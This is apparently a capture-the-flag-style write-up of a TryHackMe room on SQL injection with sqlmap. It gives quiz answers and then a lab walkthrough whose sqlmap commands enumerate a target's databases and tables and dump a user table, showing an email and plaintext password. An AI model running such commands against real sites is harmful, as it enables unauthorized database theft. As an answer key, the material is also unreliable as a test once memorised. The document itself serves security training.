---
title: "SQLMap: The Basics"
date: 2025-11-11
draft: false
tags:
  - TryHackMe
  - Cybersecurity
  - SQL
  - SQL-Injection
---
**Note:** 

- The questions are shortened for a cleaner view.
- Questions that are straightforward will only have answers attached. Such questions can be easily answered by reading the documentation given in the room.

## Task 1 - introduction 

#### 1) Which language builds the interaction...?

**Ans:** `sql`

---
## Task 2 - SQL Injection Vulnerability

#### 1) Which boolean operator checks if at least...?

**Ans:** `or`

#### 2) Is 1=1 in an SQL query always true? (YEA/NAY)

**Ans:** `YEA`

---
## Task 3 - Automated SQL Injection Tool  

#### 1) Which flag in the SQLMap tool is used to...?

**Ans:** `--dbs`

#### 2) What would be the full command of SQLMap for...?

**Ans:** `sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D members --tables`

---
## Task 4 - Practical Exercise 

*Make sure that you have the URL extracted, it should look like this:*

```
http://10.49.161.251/ai/includes/user_login?email=test&password=test
```
#### 1) How many databases are available in this web application?

*Use `sqlmap` to scan and retrieve information:*

```bash
sqlmap -u 'http://10.49.161.251/ai/includes/user_login?email=test&password=test' --dbs --level=5
```

*You can provide the following answers for the questions. For any extra steps, I just answered `n`*

- It looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? **Y/n**: `y`

- For the remaining tests, do you want to include all tests for 'MySQL' extending provided risk (1) value? **Y/n**: `y`

- Injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? **Y/n**: `y`

- GET parameter 'email' is vulnerable. Do you want to keep testing the others (if any)? **[y/N]**: `n`

```bash
available databases [6]:
[*] ai
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] test
```

**Ans:** `6`

#### 2) What is the name of the table available in the "ai" database?

*Run the following query:*

```bash
sqlmap -u 'http://10.49.161.251/ai/includes/user_login?email=test&password=test' -D ai --tables
```

```bash
Database: ai
[1 table]
+------+
| user |
+------+
```

**Ans:** `user`

#### 3) What is the name of the table available in the "ai" database?

*Based on the results, run the following query:*

```bash
sqlmap -u 'http://10.49.161.251/ai/includes/user_login?email=test&password=test' -D ai -T user --dump
```

```bash
Database: ai
Table: user
[1 entry]
+------+-----------------+---------------------+------------+
| id   | email           | created             | password   |
+------+-----------------+---------------------+------------+
| 1    | test@chatai.com | 2023-02-21 09:05:46 | 12345678   |
+------+-----------------+---------------------+------------+
```

**Ans:** `12345678`

---